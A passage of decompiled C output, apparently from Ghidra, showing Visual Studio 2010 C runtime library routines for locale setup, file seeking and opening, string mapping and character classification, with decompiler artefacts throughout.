          _MaxCount = (byte *)_strcspn((char *)_Str,"_.,");
          bVar4 = _MaxCount == (byte *)0x0;
        }
      } while( true );
    }
    param_1[8][0xf] = 0;
  }
  return 0;
}



// Library Function - Single Match
//  ___lc_lctostr
// 
// Library: Visual Studio 2010 Release

void __cdecl ___lc_lctostr(char *param_1,rsize_t param_2,char *param_3)

{
  code *pcVar1;
  errno_t eVar2;
  
  eVar2 = _strcpy_s(param_1,param_2,param_3);
  if (eVar2 == 0) {
    if (param_3[0x40] != '\0') {
      __strcats(param_1,param_2,(char *)0x2);
    }
    if (param_3[0x80] != '\0') {
      __strcats(param_1,param_2,(char *)0x2);
    }
    return;
  }
  __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __setlocale_get_all
// 
// Library: Visual Studio 2010 Release

undefined4 * __setlocale_get_all(void)

{
  bool bVar1;
  undefined4 *_Memory;
  errno_t eVar2;
  int iVar3;
  LONG LVar4;
  undefined4 *_Dst;
  int unaff_ESI;
  char **local_c;
  undefined **local_8;
  
  bVar1 = true;
  _Memory = (undefined4 *)__malloc_crt(0x355);
  _Dst = _Memory;
  if (_Memory != (undefined4 *)0x0) {
    _Dst = _Memory + 1;
    *(undefined *)_Dst = 0;
    *_Memory = 1;
    __strcats((char *)_Dst,0x351,(char *)0x3);
    local_8 = &PTR_s_LC_COLLATE_003c69c4;
    local_c = (char **)(unaff_ESI + 0x58);
    do {
      eVar2 = _strcat_s((char *)_Dst,0x351,";");
      if (eVar2 != 0) {
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        goto LAB_003b3305;
      }
      iVar3 = _strcmp(*local_c,local_c[4]);
      if (iVar3 != 0) {
        bVar1 = false;
      }
      local_8 = local_8 + 3;
      __strcats((char *)_Dst,0x351,(char *)0x3);
      local_c = local_c + 4;
    } while ((int)local_8 < 0x3c69f4);
    if (bVar1) {
LAB_003b3305:
      _free(_Memory);
      if ((*(LONG **)(unaff_ESI + 0x50) != (LONG *)0x0) &&
         (LVar4 = InterlockedDecrement(*(LONG **)(unaff_ESI + 0x50)), LVar4 == 0)) {
        _free(*(void **)(unaff_ESI + 0x50));
      }
      if ((*(LONG **)(unaff_ESI + 0x54) != (LONG *)0x0) &&
         (LVar4 = InterlockedDecrement(*(LONG **)(unaff_ESI + 0x54)), LVar4 == 0)) {
        _free(*(void **)(unaff_ESI + 0x54));
      }
      _Dst = *(undefined4 **)(unaff_ESI + 0x68);
      *(undefined4 *)(unaff_ESI + 0x54) = 0;
      *(undefined4 *)(unaff_ESI + 0x4c) = 0;
      *(undefined4 *)(unaff_ESI + 0x50) = 0;
      *(undefined4 *)(unaff_ESI + 0x48) = 0;
    }
    else {
      if ((*(LONG **)(unaff_ESI + 0x50) != (LONG *)0x0) &&
         (LVar4 = InterlockedDecrement(*(LONG **)(unaff_ESI + 0x50)), LVar4 == 0)) {
        _free(*(void **)(unaff_ESI + 0x50));
      }
      if ((*(LONG **)(unaff_ESI + 0x54) != (LONG *)0x0) &&
         (LVar4 = InterlockedDecrement(*(LONG **)(unaff_ESI + 0x54)), LVar4 == 0)) {
        _free(*(void **)(unaff_ESI + 0x54));
      }
      *(undefined4 *)(unaff_ESI + 0x54) = 0;
      *(undefined4 *)(unaff_ESI + 0x4c) = 0;
      *(undefined4 **)(unaff_ESI + 0x50) = _Memory;
      *(undefined4 **)(unaff_ESI + 0x48) = _Dst;
    }
  }
  return _Dst;
}



// Library Function - Single Match
//  __expandlocale
// 
// Library: Visual Studio 2010 Release

void __cdecl
__expandlocale(byte *param_1,char *param_2,rsize_t param_3,undefined4 *param_4,undefined4 *param_5)

{
  uint *puVar1;
  wchar_t *_Str1;
  UINT *_LpCodePage;
  _ptiddata p_Var2;
  char *_Str1_00;
  errno_t eVar3;
  int iVar4;
  BOOL BVar5;
  uint uVar6;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar7;
  wchar_t *unaff_EBX;
  wchar_t *unaff_ESI;
  wchar_t *unaff_EDI;
  uint in_stack_ffffff48;
  size_t in_stack_ffffff4c;
  char local_98 [144];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  p_Var2 = __getptd();
  puVar1 = (uint *)((p_Var2->_setloc_data)._cachein + 6);
  _Str1 = (p_Var2->_setloc_data)._cachein + 8;
  _LpCodePage = (UINT *)((p_Var2->_setloc_data)._cachein + 2);
  _Str1_00 = (char *)((int)(p_Var2->_setloc_data)._cachein + 0x93);
  uVar7 = extraout_EDX;
  if (((param_1 != (byte *)0x0) && (param_2 != (char *)0x0)) && (param_3 != 0)) {
    if (*param_1 != 0x43) goto LAB_003b3432;
    if (param_1[1] != 0) goto LAB_003b3432;
    eVar3 = _strcpy_s(param_2,param_3,"C");
    if (eVar3 != 0) {
LAB_003b3426:
      unaff_EDI = (wchar_t *)0x0;
      do {
        __invoke_watson(unaff_EDI,unaff_ESI,unaff_EBX,in_stack_ffffff48,in_stack_ffffff4c);
LAB_003b3432:
        in_stack_ffffff4c = _strlen((char *)param_1);
        if ((0x82 < in_stack_ffffff4c) ||
           ((iVar4 = _strcmp(_Str1_00,(char *)param_1), iVar4 != 0 &&
            (iVar4 = _strcmp((char *)_Str1,(char *)param_1), iVar4 != 0)))) {
          in_stack_ffffff48 = 0;
          iVar4 = ___lc_strtolc((undefined (*) [16])local_98,param_1);
          uVar7 = extraout_EDX_01;
          if ((iVar4 != 0) ||
             (BVar5 = ___get_qualified_locale
                                ((LPLC_STRINGS)local_98,_LpCodePage,(LPLC_STRINGS)local_98),
             uVar7 = extraout_EDX_02, BVar5 == 0)) goto LAB_003b3569;
          *puVar1 = (uint)(ushort)(p_Var2->_setloc_data)._cachein[4];
          ___lc_lctostr(_Str1_00,0x83,local_98);
          if ((*param_1 == 0) || (uVar6 = in_stack_ffffff4c, 0x82 < in_stack_ffffff4c)) {
            param_1 = &DAT_003ce656;
            uVar6 = in_stack_ffffff48;
          }
          eVar3 = _strncpy_s((char *)_Str1,0x83,(char *)param_1,uVar6 + 1);
          if (eVar3 != 0) goto LAB_003b3426;
        }
        param_1 = (byte *)0x0;
        if (param_4 != (undefined4 *)0x0) {
          FUN_003aee70(param_4,_LpCodePage,6);
        }
        if (param_5 != (undefined4 *)0x0) {
          FUN_003aee70(param_5,puVar1,4);
        }
        eVar3 = _strcpy_s(param_2,param_3,_Str1_00);
        uVar7 = extraout_EDX_03;
        if (eVar3 == 0) goto LAB_003b3569;
      } while( true );
    }
    if (param_4 != (undefined4 *)0x0) {
      *(undefined2 *)param_4 = 0;
      *(undefined2 *)((int)param_4 + 2) = 0;
      *(undefined2 *)(param_4 + 1) = 0;
    }
    uVar7 = extraout_EDX_00;
    if (param_5 != (undefined4 *)0x0) {
      *param_5 = 0;
    }
  }
LAB_003b3569:
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar7,(char)in_stack_ffffff48);
  return;
}



void __thiscall FUN_003b3578(void *this,byte *param_1)

{
  uint uVar1;
  undefined4 uVar2;
  int iVar3;
  undefined4 *puVar4;
  code *pcVar5;
  _ptiddata p_Var6;
  int iVar7;
  errno_t eVar8;
  int *piVar9;
  BOOL BVar10;
  uint uVar11;
  LONG LVar12;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 uVar13;
  int iVar14;
  int unaff_ESI;
  undefined8 uVar15;
  undefined in_stack_fffffe34;
  ushort local_1b4;
  uint *local_1ac;
  undefined4 local_1a8 [2];
  undefined4 *local_1a0;
  byte *local_19c;
  undefined4 *local_198;
  void *local_194;
  size_t local_190;
  WORD local_18c [128];
  char local_8c [132];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_19c = param_1;
  local_194 = this;
  p_Var6 = __getptd();
  uVar15 = __expandlocale(local_19c,local_8c,0x83,(undefined4 *)&local_1b4,local_1a8);
  uVar13 = (undefined4)((ulonglong)uVar15 >> 0x20);
  if ((int)uVar15 != 0) {
    iVar14 = (int)this * 0x10 + unaff_ESI;
    iVar7 = _strcmp(local_8c,*(char **)(iVar14 + 0x48));
    uVar13 = extraout_EDX;
    if (iVar7 != 0) {
      local_190 = _strlen(local_8c);
      local_190 = local_190 + 5;
      local_198 = (undefined4 *)__malloc_crt(local_190);
      uVar13 = extraout_EDX_00;
      if (local_198 != (undefined4 *)0x0) {
        local_19c = *(byte **)(iVar14 + 0x48);
        local_1ac = (uint *)(unaff_ESI + 0xc + (int)local_194 * 4);
        uVar1 = *local_1ac;
        local_1a0 = (undefined4 *)(((int)local_194 + 6) * 6 + unaff_ESI);
        FUN_003aee70((undefined4 *)&stack0xfffffe34,local_1a0,6);
        uVar2 = *(undefined4 *)(unaff_ESI + 4);
        eVar8 = _strcpy_s((char *)(local_198 + 1),local_190 - 4,local_8c);
        if (eVar8 != 0) {
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          pcVar5 = (code *)swi(3);
          (*pcVar5)();
          return;
        }
        *(undefined4 **)(iVar14 + 0x48) = local_198 + 1;
        *local_1ac = (uint)local_1b4;
        FUN_003aee70(local_1a0,(undefined4 *)&local_1b4,6);
        if (local_194 == (void *)0x2) {
          local_190 = 0;
          *(undefined4 *)(unaff_ESI + 4) = local_1a8[0];
          piVar9 = (int *)((p_Var6->_setloc_data)._cacheout + 9);
          iVar7 = *(int *)((p_Var6->_setloc_data)._cacheout + 0x19);
          local_1a0 = *(undefined4 **)((p_Var6->_setloc_data)._cacheout + 0x1b);
          do {
            if (*(int *)(unaff_ESI + 4) == *piVar9) {
              if (local_190 != 0) {
                piVar9 = (int *)((p_Var6->_setloc_data)._cacheout + local_190 * 4 + 9);
                *(int *)((p_Var6->_setloc_data)._cacheout + 9) = *piVar9;
                *(int *)((p_Var6->_setloc_data)._cacheout + 0xb) = piVar9[1];
                *piVar9 = iVar7;
                piVar9[1] = (int)local_1a0;
              }
              break;
            }
            iVar3 = *piVar9;
            local_190 = local_190 + 1;
            *piVar9 = iVar7;
            puVar4 = (undefined4 *)piVar9[1];
            piVar9[1] = (int)local_1a0;
            piVar9 = piVar9 + 2;
            iVar7 = iVar3;
            local_1a0 = puVar4;
          } while ((int)local_190 < 5);
          if (local_190 == 5) {
            BVar10 = ___crtGetStringTypeA
                               ((_locale_t)0x0,1,
                                "\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\x7f"
                                ,0x7f,local_18c,*(int *)(unaff_ESI + 4),*(BOOL *)(unaff_ESI + 0x14))
            ;
            if (BVar10 == 0) {
              *(undefined4 *)((p_Var6->_setloc_data)._cacheout + 0xb) = 0;
            }
            else {
              uVar11 = 0;
              do {
                local_18c[uVar11] = local_18c[uVar11] & 0x1ff;
                uVar11 = uVar11 + 1;
              } while (uVar11 < 0x7f);
              iVar7 = _memcmp(local_18c,PTR_DAT_003d64c4,0xfe);
              *(uint *)((p_Var6->_setloc_data)._cacheout + 0xb) = (uint)(iVar7 == 0);
            }
            *(undefined4 *)((p_Var6->_setloc_data)._cacheout + 9) = *(undefined4 *)(unaff_ESI + 4);
          }
          *(undefined4 *)(unaff_ESI + 0xa8) =
               *(undefined4 *)((p_Var6->_setloc_data)._cacheout + 0xb);
        }
        if (local_194 == (void *)0x1) {
          *(undefined4 *)(unaff_ESI + 8) = local_1a8[0];
        }
        uVar15 = (**(code **)(&DAT_003c69c0 + (int)local_194 * 0xc))();
        uVar13 = (undefined4)((ulonglong)uVar15 >> 0x20);
        if ((int)uVar15 == 0) {
          if (local_19c != &DAT_003d6b9c) {
            iVar7 = (int)local_194 + 5;
            LVar12 = InterlockedDecrement(*(LONG **)(unaff_ESI + iVar7 * 0x10));
            uVar13 = extraout_EDX_02;
            if (LVar12 == 0) {
              _free(*(void **)(unaff_ESI + iVar7 * 0x10));
              _free(*(void **)(iVar14 + 0x54));
              *(undefined4 *)(iVar14 + 0x4c) = 0;
              uVar13 = extraout_EDX_03;
            }
          }
          *local_198 = 1;
          *(undefined4 **)(unaff_ESI + ((int)local_194 + 5) * 0x10) = local_198;
        }
        else {
          *(byte **)(iVar14 + 0x48) = local_19c;
          _free(local_198);
          *local_1ac = uVar1;
          *(undefined4 *)(unaff_ESI + 4) = uVar2;
          uVar13 = extraout_EDX_01;
        }
      }
    }
  }
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar13,in_stack_fffffe34);
  return;
}



// Library Function - Single Match
//  __setlocale_nolock
// 
// Library: Visual Studio 2010 Release

void __fastcall __setlocale_nolock(void *param_1,int param_2,byte *param_3)

{
  bool bVar1;
  char *pcVar2;
  size_t sVar3;
  int iVar4;
  size_t sVar5;
  errno_t eVar6;
  int extraout_EDX;
  int extraout_EDX_00;
  int extraout_EDX_01;
  int iVar7;
  int extraout_EDX_02;
  int extraout_EDX_03;
  int extraout_EDX_04;
  void *this;
  undefined **ppuVar8;
  char **ppcVar9;
  undefined8 uVar10;
  void *local_98;
  int local_90;
  byte local_8c [132];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  this = (void *)0x0;
  iVar4 = param_2;
  if (param_1 != (void *)0x0) {
    iVar7 = param_2;
    if (param_3 != (byte *)0x0) {
      FUN_003b3578(param_1,param_3);
      iVar7 = extraout_EDX;
      iVar4 = param_2;
    }
    goto LAB_003b3abf;
  }
  bVar1 = true;
  local_90 = 0;
  if (param_3 != (byte *)0x0) {
    if (((*param_3 == 0x4c) && (param_3[1] == 0x43)) && (param_3[2] == 0x5f)) {
      do {
        pcVar2 = _strpbrk((char *)param_3,"=;");
        iVar7 = extraout_EDX_00;
        iVar4 = param_2;
        if (((pcVar2 == (char *)0x0) || (sVar3 = (int)pcVar2 - (int)param_3, sVar3 == 0)) ||
           (*pcVar2 == ';')) goto LAB_003b3abf;
        local_98 = (void *)0x1;
        ppuVar8 = &PTR_s_LC_COLLATE_003c69c4;
        do {
          iVar4 = _strncmp(*ppuVar8,(char *)param_3,sVar3);
          if ((iVar4 == 0) && (sVar5 = _strlen(*ppuVar8), sVar3 == sVar5)) break;
          local_98 = (void *)((int)local_98 + 1);
          ppuVar8 = ppuVar8 + 3;
        } while ((int)ppuVar8 < 0x3c69f5);
        pcVar2 = pcVar2 + 1;
        sVar3 = _strcspn(pcVar2,";");
        iVar7 = extraout_EDX_01;
        if ((sVar3 == 0) && (iVar4 = param_2, *pcVar2 != ';')) goto LAB_003b3abf;
        if ((int)local_98 < 6) {
          eVar6 = _strncpy_s((char *)local_8c,0x83,pcVar2,sVar3);
          if (eVar6 != 0) {
            __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
            iVar7 = extraout_EDX_02;
            iVar4 = param_2;
            goto LAB_003b3abf;
          }
          local_8c[sVar3] = 0;
          uVar10 = FUN_003b3578(local_98,local_8c);
          iVar7 = (int)((ulonglong)uVar10 >> 0x20);
          if ((int)uVar10 != 0) {
            local_90 = local_90 + 1;
          }
        }
      } while ((pcVar2[sVar3] != '\0') && (param_3 = (byte *)(pcVar2 + sVar3 + 1), *param_3 != 0));
    }
    else {
      uVar10 = __expandlocale(param_3,(char *)local_8c,0x83,(undefined4 *)0x0,(undefined4 *)0x0);
      iVar7 = (int)((ulonglong)uVar10 >> 0x20);
      if ((int)uVar10 == 0) goto LAB_003b3abf;
      ppcVar9 = (char **)(param_2 + 0x48);
      param_2 = iVar4;
      do {
        if (this != (void *)0x0) {
          iVar4 = _strcmp((char *)local_8c,*ppcVar9);
          iVar7 = extraout_EDX_03;
          if (iVar4 != 0) {
            uVar10 = FUN_003b3578(this,local_8c);
            iVar7 = (int)((ulonglong)uVar10 >> 0x20);
            if ((int)uVar10 == 0) {
              bVar1 = false;
              goto LAB_003b3a9f;
            }
          }
          local_90 = local_90 + 1;
        }
LAB_003b3a9f:
        this = (void *)((int)this + 1);
        ppcVar9 = ppcVar9 + 4;
      } while ((int)this < 6);
      if (bVar1) goto LAB_003b3aba;
    }
    iVar4 = param_2;
    if (local_90 == 0) goto LAB_003b3abf;
  }
LAB_003b3aba:
  __setlocale_get_all();
  iVar7 = extraout_EDX_04;
  iVar4 = param_2;
LAB_003b3abf:
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,iVar7,(char)iVar4);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _setlocale
// 
// Library: Visual Studio 2010 Release

char * __cdecl _setlocale(int _Category,char *_Locale)

{
  int *piVar1;
  _ptiddata p_Var2;
  LONG *pLVar3;
  int iVar4;
  char *local_24;
  
  local_24 = (char *)0x0;
  if ((uint)_Category < 6) {
    p_Var2 = __getptd();
    ___updatetlocinfo();
    p_Var2->_ownlocale = p_Var2->_ownlocale | 0x10;
    pLVar3 = (LONG *)__calloc_crt(0xd8,1);
    if (pLVar3 != (LONG *)0x0) {
      __lock(0xc);
      __copytlocinfo_nolock(&p_Var2->ptlocinfo->refcount);
      FUN_003b3c00();
      local_24 = (char *)__setlocale_nolock((void *)_Category,(int)pLVar3,(byte *)_Locale);
      if (local_24 == (char *)0x0) {
        ___removelocaleref(pLVar3);
        ___freetlocinfo(pLVar3);
      }
      else {
        if (_Locale != (char *)0x0) {
          iVar4 = _strcmp(_Locale,&DAT_003d6b9c);
          if (iVar4 != 0) {
            _DAT_003d7cf8 = 1;
          }
        }
        __lock(0xc);
        __updatetlocinfoEx_nolock((LONG **)&p_Var2->ptlocinfo,pLVar3);
        ___removelocaleref(pLVar3);
        if (((*(byte *)&p_Var2->_ownlocale & 2) == 0) && (((byte)DAT_003d6b98 & 1) == 0)) {
          __updatetlocinfoEx_nolock((LONG **)&PTR_DAT_003d6de0,&p_Var2->ptlocinfo->refcount);
          PTR_PTR_DAT_003d64b8 = *(undefined **)(PTR_DAT_003d6de0 + 0xbc);
          PTR_DAT_003d64c8 = *(undefined **)(PTR_DAT_003d6de0 + 200);
          _DAT_003d70c4 = *(undefined4 *)(PTR_DAT_003d6de0 + 0xac);
        }
        FUN_003b3c0c();
      }
    }
    FUN_003b3c3d();
  }
  else {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    local_24 = (char *)0x0;
  }
  return local_24;
}



void FUN_003b3c00(void)

{
  FUN_003b8677(0xc);
  return;
}



void FUN_003b3c0c(void)

{
  FUN_003b8677(0xc);
  return;
}



void FUN_003b3c3d(void)

{
  int unaff_ESI;
  
  *(uint *)(unaff_ESI + 0x70) = *(uint *)(unaff_ESI + 0x70) & 0xffffffef;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __fsopen
// 
// Library: Visual Studio 2010 Release

FILE * __cdecl __fsopen(char *_Filename,char *_Mode,int _ShFlag)

{
  int *piVar1;
  FILE *pFVar2;
  undefined local_14 [8];
  undefined4 uStack12;
  undefined *local_8;
  
  local_8 = &DAT_003d2c68;
  uStack12 = 0x3b3c4e;
  if (((_Filename == (char *)0x0) || (_Mode == (char *)0x0)) || (*_Mode == '\0')) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
  }
  else {
    pFVar2 = __getstream();
    if (pFVar2 == (FILE *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x18;
    }
    else {
      local_8 = (undefined *)0x0;
      if (*_Filename != '\0') {
        pFVar2 = __openfile(_Filename,_Mode,_ShFlag,pFVar2);
        local_8 = (undefined *)0xfffffffe;
        FUN_003b3cf4();
        return pFVar2;
      }
      piVar1 = __errno();
      *piVar1 = 0x16;
      __local_unwind4(&DAT_003d6664,(int)local_14,0xfffffffe);
    }
  }
  return (FILE *)0x0;
}



void FUN_003b3cf4(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fseek_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __fseek_nolock(FILE *_File,long _Offset,int _Origin)

{
  uint uVar1;
  int *piVar2;
  int iVar3;
  long lVar4;
  
  if ((_File->_flag & 0x83U) == 0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    iVar3 = -1;
  }
  else {
    _File->_flag = _File->_flag & 0xffffffef;
    if (_Origin == 1) {
      lVar4 = __ftell_nolock(_File);
      _Offset = _Offset + lVar4;
      _Origin = 0;
    }
    __flush(_File);
    uVar1 = _File->_flag;
    if ((char)uVar1 < '\0') {
      _File->_flag = uVar1 & 0xfffffffc;
    }
    else {
      if ((((uVar1 & 1) != 0) && ((uVar1 & 8) != 0)) && ((uVar1 & 0x400) == 0)) {
        _File->_bufsiz = 0x200;
      }
    }
    iVar3 = __fileno(_File);
    lVar4 = __lseek(iVar3,_Offset,_Origin);
    iVar3 = (lVar4 != -1) - 1;
  }
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _fseek
// 
// Library: Visual Studio 2010 Release

int __cdecl _fseek(FILE *_File,long _Offset,int _Origin)

{
  int *piVar1;
  int iVar2;
  
  if ((_File == (FILE *)0x0) || (((_Origin != 0 && (_Origin != 1)) && (_Origin != 2)))) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    iVar2 = -1;
  }
  else {
    __lock_file(_File);
    iVar2 = __fseek_nolock(_File,_Offset,_Origin);
    FUN_003b3dfa();
  }
  return iVar2;
}



void FUN_003b3dfa(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freea
// 
// Library: Visual Studio 2010 Release

void __cdecl __freea(void *_Memory)

{
  if ((_Memory != (void *)0x0) && (*(int *)((int)_Memory + -8) == 0xdddd)) {
    _free((int *)((int)_Memory + -8));
  }
  return;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2010 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,unsigned_long param_2,unsigned_long param_3,char *param_4,
          int param_5,char *param_6,int param_7,int param_8,int param_9)

{
  uint _Size;
  bool bVar1;
  uint uVar2;
  char *pcVar3;
  int iVar4;
  uint uVar5;
  undefined4 *puVar6;
  int iVar7;
  uint extraout_EDX;
  uint uVar8;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  undefined uVar9;
  uint cchSrc;
  undefined4 *local_10;
  
  uVar2 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  pcVar3 = param_4;
  iVar7 = param_5;
  if (0 < param_5) {
    do {
      iVar7 = iVar7 + -1;
      if (*pcVar3 == '\0') goto LAB_003b3e54;
      pcVar3 = pcVar3 + 1;
    } while (iVar7 != 0);
    iVar7 = -1;
LAB_003b3e54:
    iVar7 = param_5 - iVar7;
    iVar4 = iVar7 + -1;
    bVar1 = iVar4 < param_5;
    param_5 = iVar4;
    if (bVar1) {
      param_5 = iVar7;
    }
  }
  if (param_8 == 0) {
    param_8 = param_1->locinfo->lc_codepage;
  }
  uVar5 = MultiByteToWideChar(param_8,(uint)(param_9 != 0) * 8 + 1,param_4,param_5,(LPWSTR)0x0,0);
  uVar8 = extraout_EDX;
  cchSrc = uVar5;
  if (uVar5 != 0) {
    if (((int)uVar5 < 1) || (uVar8 = 0xffffffe0 % uVar5, 0xffffffe0 / uVar5 < 2)) {
      local_10 = (undefined4 *)0x0;
    }
    else {
      _Size = uVar5 * 2 + 8;
      if (_Size < 0x401) {
        puVar6 = (undefined4 *)&stack0xffffffe0;
        local_10 = (undefined4 *)&stack0xffffffe0;
        if ((undefined *)register0x00000010 != (undefined *)0x20) {
LAB_003b3ee4:
          local_10 = puVar6 + 2;
        }
      }
      else {
        puVar6 = (undefined4 *)_malloc(_Size);
        uVar8 = extraout_EDX_00;
        local_10 = puVar6;
        if (puVar6 != (undefined4 *)0x0) {
          *puVar6 = 0xdddd;
          goto LAB_003b3ee4;
        }
      }
    }
    if (local_10 != (undefined4 *)0x0) {
      iVar7 = MultiByteToWideChar(param_8,1,param_4,param_5,(LPWSTR)local_10,uVar5);
      if ((iVar7 != 0) &&
         (uVar8 = LCMapStringW(param_2,param_3,(LPCWSTR)local_10,uVar5,(LPWSTR)0x0,0), uVar8 != 0))
      {
        if ((param_3 & 0x400) == 0) {
          if (((int)uVar8 < 1) || (0xffffffe0 / uVar8 < 2)) {
            puVar6 = (undefined4 *)0x0;
          }
          else {
            uVar5 = uVar8 * 2 + 8;
            if (uVar5 < 0x401) {
              if ((undefined *)register0x00000010 == (undefined *)0x20) goto LAB_003b3fed;
              puVar6 = (undefined4 *)&stack0xffffffe8;
            }
            else {
              puVar6 = (undefined4 *)_malloc(uVar5);
              if (puVar6 != (undefined4 *)0x0) {
                *puVar6 = 0xdddd;
                puVar6 = puVar6 + 2;
              }
            }
          }
          if (puVar6 != (undefined4 *)0x0) {
            iVar7 = LCMapStringW(param_2,param_3,(LPCWSTR)local_10,cchSrc,(LPWSTR)puVar6,uVar8);
            if (iVar7 != 0) {
              if (param_7 == 0) {
                param_7 = 0;
                param_6 = (LPSTR)0x0;
              }
              WideCharToMultiByte(param_8,0,(LPCWSTR)puVar6,uVar8,param_6,param_7,(LPCSTR)0x0,
                                  (LPBOOL)0x0);
            }
            __freea(puVar6);
          }
        }
        else {
          if ((param_7 != 0) && ((int)uVar8 <= param_7)) {
            LCMapStringW(param_2,param_3,(LPCWSTR)local_10,uVar5,(LPWSTR)param_6,param_7);
          }
        }
      }
LAB_003b3fed:
      uVar9 = (undefined)cchSrc;
      __freea(local_10);
      uVar8 = extraout_EDX_01;
      goto LAB_003b3ff9;
    }
  }
  uVar9 = (undefined)cchSrc;
LAB_003b3ff9:
  iVar7 = terminate_if_debugger_present(uVar2 ^ (uint)&stack0xfffffffc,uVar8,uVar9);
  return iVar7;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2010 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    (&local_14,(unsigned_long)_LocaleName,_DwMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,
                     _CchDest,_Code_page,_BError);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___pctype_func
// 
// Library: Visual Studio 2010 Release

ushort * __cdecl ___pctype_func(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  ptVar2 = p_Var1->ptlocinfo;
  if ((ptVar2 != (pthreadlocinfo)PTR_DAT_003d6de0) && ((p_Var1->_ownlocale & DAT_003d6b98) == 0)) {
    ptVar2 = ___updatetlocinfo();
  }
  return (ushort *)ptVar2[1].lc_category[0].locale;
}



// Library Function - Single Match
//  __isupper_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __isupper_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 1;
  }
  else {
    uVar1 = __isctype_l(_C,1,(_locale_t)&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _isupper
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _isupper(int _C)

{
  uint uVar1;
  
  if (_DAT_003d7cf8 == 0) {
    return *(ushort *)(PTR_DAT_003d6dd0 + _C * 2) & 1;
  }
  uVar1 = __isupper_l(_C,(_locale_t)0x0);
  return uVar1;
}



// Library Function - Single Match
//  __islower_l
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __islower_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
